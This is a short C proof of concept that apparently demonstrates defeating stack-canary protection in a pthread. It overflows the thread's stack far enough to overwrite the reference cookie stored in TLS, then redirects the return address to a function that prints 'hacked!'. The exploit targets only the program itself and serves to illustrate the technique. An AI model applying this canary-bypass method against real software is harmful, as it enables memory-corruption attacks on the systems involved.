#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <asm/prctl.h>
#include <sys/prctl.h>

#define HACKED "hacked!\n"

void pwn_payload() {
	write(1, HACKED, sizeof(HACKED));
	*((int*)0) = 1; // terminate
}

void * first(void *x)
{
    int a = (int)x;
	unsigned long *addr;
	int res = arch_prctl(ARCH_GET_FS, &addr);
	if (res < 0)
	{
		printf("Failed get thread FS, sorry\n");
	}
	printf("thread FS %p\n", addr);
	printf("cookie thread: 0x%lx\n", addr[5]);
	unsigned long * frame = __builtin_frame_address(0);
	printf("stack_cookie addr %p \n", &frame[-1]);
	printf("diff : %lx\n", (char*)addr - (char*)&frame[-1]); 
	unsigned long len =(unsigned long)( (char*)addr - (char*)&frame[-1]);
	// Just example of exploitation
	memset(&frame[-1], 0x41, len+0x30);	
	frame[1] = &pwn_payload;

	return 0;
}

int main(int argc, char **argv, char **envp)
{
    int res;
	unsigned long *addr;
	res = arch_prctl(ARCH_GET_FS, &addr);
	if (res < 0)
	{
		printf("Failed get FS, sorry\n");
		return -1;
	}

	printf("main FS %p\n", addr);
	printf("cookie main: 0x%lx\n", addr[5]);
        pthread_t one;


        res = pthread_create(&one, NULL, &first, 0);
        if (res)
        {
                printf("Failed create thread \n");
                return -1;
        }
        void *val;
        pthread_join(one,&val);
        return 0;
}

